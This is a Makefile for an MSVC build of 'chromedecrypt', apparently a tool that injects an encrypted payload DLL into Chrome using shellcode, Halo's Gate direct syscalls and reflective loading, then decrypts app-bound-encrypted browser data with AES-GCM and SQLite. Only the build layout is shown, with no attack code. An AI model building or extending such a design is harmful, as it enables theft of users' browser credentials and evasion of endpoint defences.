# chromedecrypt - Makefile for MSVC toolchain (nmake)
# Requires: Visual Studio Build Tools (cl.exe, ml64.exe, link.exe)
# Build from x64 Native Tools Command Prompt:  nmake
# Clean:                                        nmake clean

CC      = cl.exe
ASM     = ml64.exe
LINK    = link.exe

OUTDIR  = build
BINDIR  = $(OUTDIR)\bin

# Common flags
COMMON  = /nologo /O2 /W3 /D_CRT_SECURE_NO_WARNINGS /DWIN32_LEAN_AND_MEAN /I src /I libs\sqlite

# Injector: no CRT buffer security, minimal
INJ_CFLAGS = $(COMMON) /GS-
INJ_LDFLAGS = /nologo /SUBSYSTEM:CONSOLE
INJ_LIBS = kernel32.lib user32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib crypt32.lib bcrypt.lib

# Payload DLL: needs full CRT (sqlite, stdio)
PLD_CFLAGS = $(COMMON) /DSQLITE_THREADSAFE=0 /DSQLITE_OMIT_LOAD_EXTENSION
PLD_LDFLAGS = /nologo /SUBSYSTEM:WINDOWS /DLL
PLD_LIBS = kernel32.lib user32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib crypt32.lib bcrypt.lib

# Encrypt tool
ENC_CFLAGS = $(COMMON)
ENC_LDFLAGS = /nologo /SUBSYSTEM:CONSOLE
ENC_LIBS = kernel32.lib bcrypt.lib

# ---------- Sources ----------

INJ_SRCS = src\injector\main.c \
           src\injector\injector.c \
           src\injector\shellcode.c \
           src\syscalls\halogate.c \
           src\syscalls\wrappers.c \
           src\crypto\xor_crypt.c

INJ_ASM  = src\syscalls\stub.asm

PLD_SRCS = src\payload\payload.c \
           src\payload\rdi.c \
           src\abe\elevator.c \
           src\crypto\aes_gcm.c \
           src\utils\json_writer.c \
           src\utils\strutil.c \
           libs\sqlite\sqlite3.c

ENC_SRCS = src\crypto\encrypt_payload.c \
           src\crypto\xor_crypt.c

# ---------- Targets ----------

all: dirs injector payload encrypt_tool

dirs:
	@if not exist $(OUTDIR) mkdir $(OUTDIR)
	@if not exist $(BINDIR) mkdir $(BINDIR)

injector: dirs $(BINDIR)\chromedecrypt.exe

payload: dirs $(BINDIR)\payload.dll

encrypt_tool: dirs $(BINDIR)\encrypt_payload.exe

$(BINDIR)\chromedecrypt.exe: $(INJ_SRCS) $(INJ_ASM)
	$(ASM) /nologo /c /Fo$(OUTDIR)\stub.obj $(INJ_ASM)
	$(CC) $(INJ_CFLAGS) /Fe$@ $(INJ_SRCS) $(OUTDIR)\stub.obj /link $(INJ_LDFLAGS) $(INJ_LIBS)

$(BINDIR)\payload.dll: $(PLD_SRCS)
	$(CC) $(PLD_CFLAGS) /Fe$@ $(PLD_SRCS) /link $(PLD_LDFLAGS) $(PLD_LIBS) /EXPORT:payload_main

$(BINDIR)\encrypt_payload.exe: $(ENC_SRCS)
	$(CC) $(ENC_CFLAGS) /Fe$@ $(ENC_SRCS) /link $(ENC_LDFLAGS) $(ENC_LIBS)

clean:
	@if exist $(OUTDIR) rmdir /s /q $(OUTDIR)
	@del /q *.obj 2>nul
	@del /q src\injector\*.obj 2>nul
	@del /q src\payload\*.obj 2>nul
	@del /q src\syscalls\*.obj 2>nul
	@del /q src\abe\*.obj 2>nul
	@del /q src\crypto\*.obj 2>nul
	@del /q src\utils\*.obj 2>nul
	@del /q libs\sqlite\*.obj 2>nul

.PHONY: all dirs clean injector payload encrypt_tool
